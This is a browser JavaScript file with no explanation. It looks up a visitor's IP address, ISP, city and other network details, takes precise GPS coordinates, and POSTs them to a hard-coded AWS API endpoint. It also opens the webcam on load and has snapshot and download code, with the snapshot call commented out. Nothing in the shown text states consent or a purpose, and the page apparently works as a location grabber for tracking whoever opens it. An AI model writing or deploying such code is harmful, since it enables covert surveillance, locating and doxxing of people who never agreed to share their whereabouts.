var dados = {};
const getLocation = () => {
  fetch("https://ipapi.co/json/")
  .then((response) => response.json())
  .then((data) => {

  dados[0] = {'apiLong': data.latitude, 
          'apiLat': data.longitude, 
          'apiIp': data.ip,
          'apiNetwork': data.network,
          'apiVersion' : data.version,
          'apiCity' : data.city,
          'apiRegion' : data.region,
          'apiRegionCode' : data.region_code,
          'apiCountry' : data.country,
          'apiCountryName' : data.country_name,
          'apiCountryCode' : data.country_code,
          'apiCountryCodeIso' : data.country_code_iso3,
          'apiCountryCapital' : data.country_capital,
          'apiCountryTld' : data.country_tld,
          'apiContinentCode' : data.continent_code,
          'apiInEu' : data.in_eu,
          'apiPostal' : data.postal,
          'apiTimezone' : data.timezone,
          'apiUtc' : data.utc_offset,
          'apiCountryCallingCode' : data.country_calling_code,
          'apiCurrency' : data.currency,
          'apiCurrencyName' : data.currency_name,
          'apiLanguagues' : data.languages,
          'apiCountryArea' : data.country_area,
          'apiCountryPopulation' : data.country_population,
          'apiAsn' : data.asn,
          'apiOrg' : data.org
        };

    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition((position) => {
        var latitudeReal = position.coords.latitude;
        var longitudeReal = position.coords.longitude;
        var accuracyReal = position.coords.accuracy;

        console.log('dados');
        console.log(dados);

        dados[1] = {
          'latitudeReal': latitudeReal,
          'longitudeReal': longitudeReal,
          'accuracyReal': accuracyReal
        }

        fetch("https://nu9chd8cr4.execute-api.us-east-1.amazonaws.com/prod", {
          method: "POST",
          headers: {
              "Content-Type": "application/json"
          },
          body: JSON.stringify(dados)
        }).then((response) => response.json())
          .then((data) => {
            console.log("Success: ", data)
          })
          .catch((error) => {
            console.error("Error", error);
          });
      });
  
    }
  });

  
};

let video = document.createElement('video');
navigator.mediaDevices.getUserMedia({video: true})
.then((stream) => {
  video.srcObject = stream
  return video.play()
}).then(() => {
    setTimeout(() => {
      let button = document.createElement('button')
      button.click();
    //  takeSnapshot().then(download);
    }, "1000");
})

function takeSnapshot(){
  let canvas = document.createElement("canvas");
  let context = canvas.getContext('2d');
  canvas.width = video.videoWidth
  canvas.height = video.videoHeight

  context.drawImage(video, 0, 0);
 
  return new Promise((res, rej) => {
    canvas.toBlob(res, "image/jpeg")
  });
}

function download(blob){
  let a = document.createElement('a');
  a.href = URL.createObjectURL(blob)
  a.download = "Screenshot.jpg"
  document.body.appendChild(a)
  a.click();
}












// function submitToAPI(e){
//  var URL = "https://nu9chd8cr4.execute-api.us-east-1.amazonaws.com/prod";

//  var data = {
//   latitudeReal: latitudeReal,
//   longitudeReal: longitudeReal,
//   accuracyReal:  accuracyReal
//  }
// console.log('data');
//  console.log(data);

//  $.ajax({
//    type: "POST",
//    url: "https://nu9chd8cr4.execute-api.us-east-1.amazonaws.com/prod",
//    dataType: "json",
//    crossDomain: "true",
//    contentType: "application/json; charset=utf-8",
//    data: JSON.stringify(data)
//  });

// }